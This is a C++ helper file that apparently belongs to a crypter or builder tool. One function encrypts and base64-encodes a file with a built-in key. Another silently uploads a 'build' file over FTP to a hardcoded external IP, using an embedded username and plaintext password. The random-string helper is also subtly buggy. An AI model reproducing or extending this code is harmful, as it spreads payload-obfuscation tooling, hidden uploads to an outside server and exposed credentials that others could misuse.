#include "Misc.h"

std::string RandomString(int len)
{
	srand(time(0));
	std::string str = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	int pos;
	while (str.size() != len)
	{
		pos = ((rand() % (str.size() - 1)));
		str.erase(pos, 1);

	}
	return str;
}

void UploadBuild(char * username, char * uploadName)
{
	HINTERNET hInternet;
	HINTERNET hFtpSession;
	hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (hInternet == NULL)
	{
		std::cout << "Error: " << GetLastError();
	}
	else
	{
		hFtpSession = InternetConnect(hInternet, "185.62.188.4", INTERNET_DEFAULT_FTP_PORT, "server@isolation.top", "t;Xn(klSX-g}", INTERNET_SERVICE_FTP, 0, 0);
		if (hFtpSession == NULL)
		{
			std::cout << "Error: " << GetLastError();
		}
		else
		{

			char fileName[512];
			sprintf(fileName, "build_%s.txt", username);
			if (!FtpPutFile(hFtpSession, uploadName, fileName, FTP_TRANSFER_TYPE_BINARY, 0))
			{
				std::cout << "Error: " << GetLastError();
			}
		}
	}
}

void CryptFile(char * filename, char * output)
{
	std::vector < BYTE > decrypted = readFile(filename);
	std::vector < BYTE > crypted = crypt(decrypted, std::vector < BYTE >(KEY));
	std::string crypted_txt = base64_encode(&crypted[0], crypted.size());
	std::ofstream out(output);
	out << crypted_txt;
	out.close();
}


inline bool exist(const std::string& name)
{
	return GetFileAttributes(name.c_str()) != INVALID_FILE_ATTRIBUTES;
}

